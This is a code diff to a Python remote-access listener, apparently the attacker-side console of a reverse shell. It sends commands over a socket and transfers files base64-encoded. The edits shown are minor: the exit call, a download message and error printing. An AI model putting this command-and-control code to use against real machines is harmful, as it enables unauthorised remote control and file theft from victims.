@@ -1,3 +1,4 @@
+import sys
 import json
 import base64
 import socket
@@ -29,13 +30,13 @@ class Connections_Listener:
         self.send_data(command)
         if command[0].lower() == 'exit':
             self.connection.close()
-            exit()
+            sys.exit()
         return self.receive_data()
     
     def download_file(self, path, content):
         with open(path, 'wb') as file:
             file.write(base64.b64decode(content))
-            return "[+] File download successful"
+            return f"[+] \"{path}\" file download successful"
     
     def upload_files(eslf, path):
         with open(path, 'rb') as file:
@@ -53,7 +54,8 @@ class Connections_Listener:
                     result = self.download_file(input_command[1], result.encode('utf-8'))
             except Exception as error:
                 print(error)
-                print("\n\n----- [=] Connection is still intact [=] -----")
+                print(type(error))
+                # print("\n----- [=] Connection is still intact [=] -----")
 
 listen = Connections_Listener(ip, port)
 listen.start()
